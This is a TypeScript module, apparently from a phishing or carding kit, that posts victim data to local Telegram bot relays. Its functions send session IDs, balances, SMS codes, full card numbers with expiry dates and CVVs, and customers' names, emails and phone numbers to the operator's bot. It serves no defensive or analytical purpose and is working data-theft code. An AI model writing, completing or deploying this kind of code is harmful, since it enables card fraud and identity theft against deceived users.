// telegram.ts
import axios from "axios";

export async function sendLogToBot(data: {
  sessionId: string;
  maskedPan: string;
  bookingId?: string;
}) {
  try {
    const response = await axios.post("http://localhost:8000/notify", data);
    return response.data;
  } catch (error) {
    console.error("Error sending log to bot:", error);
    throw error;
  }
}

export async function notifyBalance(sessionId: string, balance: number) {
  try {
    await axios.post("http://localhost:8000/balance-notify", {
      sessionId,
      balance,
    });
  } catch (err) {
    console.error("Ошибка при отправке уведомления в бот:", err);
  }
}

export async function notifySms(sessionId: string, sms: number) {
  try {
    await axios.post("http://localhost:8000/sms-notify", {
      sessionId,
      sms,
    });
  } catch (err) {
    console.error("Ошибка при отправке уведомления в бот:", err);
  }
}

export async function notifyChange(
  sessionId: string,
  changed_card: number,
  changed_expire: string,
  changed_cvv: number
) {
  try {
    await axios.post("http://localhost:8000/change-card-notify", {
      sessionId,
      changed_card,
      changed_expire,
      changed_cvv,
    });
  } catch (err) {
    console.error("Ошибка при отправке уведомления в бот:", err);
  }
}

export async function sendCustomerToEchoBot(data: {
  sessionId: string;
  firstName: string;
  lastName: string;
  email: string;
  phoneNumber: string;
}) {
  try {
    const response = await axios.post(
      "http://localhost:8001/echo-form-data",
      data
    );
    console.log("✅ Данные клиента отправлены в эхо-бота");
    return response.data;
  } catch (error) {
    console.error("❌ Ошибка отправки данных в эхо-бота:", error);
    throw error;
  }
}
